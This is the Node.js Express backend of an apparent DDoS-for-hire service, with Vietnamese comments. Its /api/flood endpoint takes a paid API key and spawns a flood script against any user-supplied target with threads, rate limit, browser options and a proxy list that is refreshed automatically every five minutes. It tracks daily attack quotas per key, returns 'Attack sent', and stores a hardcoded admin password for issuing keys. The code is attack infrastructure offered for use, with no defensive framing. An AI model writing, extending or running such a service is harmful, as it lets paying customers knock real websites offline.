const express = require("express");
const cors = require("cors");
const { spawn } = require("child_process");
const path = require("path");
const fs = require("fs-extra");
const os = require("os");

const app = express();
app.use(cors());
app.use(express.json());

const PORT = process.env.PORT || 8080;
const KEY_FILE = "apikey.json";
const PROXY_FILE = "proxy.txt";
const ADMIN_PASSWORD = "Mduc2007@"; 
const activeAttacks = new Map();

// Helper: Quản lý Key
const getKeys = () => {
    if (!fs.existsSync(KEY_FILE)) fs.writeJsonSync(KEY_FILE, { keys: [] });
    return fs.readJsonSync(KEY_FILE).keys;
};
const saveKeys = (keys) => fs.writeJsonSync(KEY_FILE, { keys }, { spaces: 2 });

// --- TỰ ĐỘNG CẬP NHẬT PROXY MỖI 5 PHÚT ---
function startAutoProxyUpdate() {
    const proxyScript = path.join(__dirname, "proxy.js");
    const runScraper = () => {
        console.log(`[${new Date().toLocaleTimeString()}] 🔄 Đang chạy proxy.js...`);
        const child = spawn("node", [proxyScript], { cwd: __dirname });
        child.on("exit", (code) => {
            if (code === 0) console.log(`[${new Date().toLocaleTimeString()}] ✅ Đã cập nhật proxy.`);
            else console.error(`[${new Date().toLocaleTimeString()}] ❌ Lỗi proxy.js (Code: ${code})`);
        });
    };
    runScraper(); // Chạy ngay khi start
    setInterval(runScraper, 5 * 60 * 1000); // Lặp lại mỗi 5 phút
}
startAutoProxyUpdate();

// --- API TẤN CÔNG ---
app.get("/api/flood", (req, res) => {
    let { key, target, time, threads, ratelimit, options } = req.query;

    let keys = getKeys();
    let keyData = keys.find(k => k.key === key);
    if (!keyData) return res.status(403).json({ status: "error", msg: "Invalid API Key" });

    // Reset daily limit
    const today = new Date().toISOString().split('T')[0];
    if (keyData.last_reset_date !== today) {
        keyData.usage_today = 0;
        keyData.last_reset_date = today;
    }

    if (!target || !time || !threads || !ratelimit) return res.json({ status: "error", msg: "Missing params: target, time, threads, ratelimit" });
    if (keyData.usage_today >= keyData.daily_limit) return res.json({ status: "error", msg: "Daily limit reached" });

    // Xử lý Options và Giới hạn Browser
    let rawOptions = options ? options.split(" ") : [];
    let finalOptions = [];
    for (let i = 0; i < rawOptions.length; i++) {
        let opt = rawOptions[i];
        if (opt.startsWith("--") && keyData.allowed_options.includes(opt)) {
            if (opt === "--browser") {
                let count = parseInt(rawOptions[i + 1]);
                if (!isNaN(count)) {
                    finalOptions.push("--browser", Math.min(count, keyData.max_browsers).toString());
                    i++; continue;
                }
            }
            finalOptions.push(opt);
        }
    }

    const scriptPath = path.join(__dirname, "script.js");
    const cmdArgs = [scriptPath, target, time, threads, ratelimit, PROXY_FILE, ...finalOptions];

    const child = spawn("node", cmdArgs, { detached: true, stdio: 'ignore' });
    const attackId = `mduc_${Date.now()}`;
    activeAttacks.set(attackId, { process: child, key, target });
    keyData.usage_today += 1;
    saveKeys(keys);

    child.on("close", () => activeAttacks.delete(attackId));
    res.json({ status: "success", msg: "Attack sent", data: { attackId, threads, ratelimit, options: finalOptions.join(" ") } });
});

// --- QUẢN LÝ PROXY & STATUS ---
app.get("/api/proxy-count", (req, res) => {
    if (!fs.existsSync(PROXY_FILE)) return res.json({ count: 0 });
    const content = fs.readFileSync(PROXY_FILE, "utf8");
    const lines = content.split("\n").filter(l => l.trim()).length;
    res.json({ status: "success", total_proxies: lines });
});

app.get("/api/status", (req, res) => {
    res.json({ service: "MDUC API", active: activeAttacks.size, ram: (os.freemem()/1024/1024/1024).toFixed(2) + "GB Free" });
});

// --- ADMIN: THÊM KEY ---
app.post("/api/admin/addkey", (req, res) => {
    const { admin_pass, new_key, owner, max_duration, daily_limit, max_concurrent, allowed_options, max_browsers } = req.body;
    if (admin_pass !== ADMIN_PASSWORD) return res.status(401).json({ msg: "Wrong password" });

    let keys = getKeys();
    keys.push({
        key: new_key, owner, max_duration: max_duration || 60,
        daily_limit: daily_limit || 10, max_concurrent: max_concurrent || 1,
        max_browsers: max_browsers || 2, allowed_options: allowed_options || ["--randpath"],
        usage_today: 0, last_reset_date: new Date().toISOString().split('T')[0]
    });
    saveKeys(keys);
    res.json({ status: "success", msg: "Key added" });
});

app.listen(PORT, () => console.log(`🚀 API Server running on port ${PORT}`));
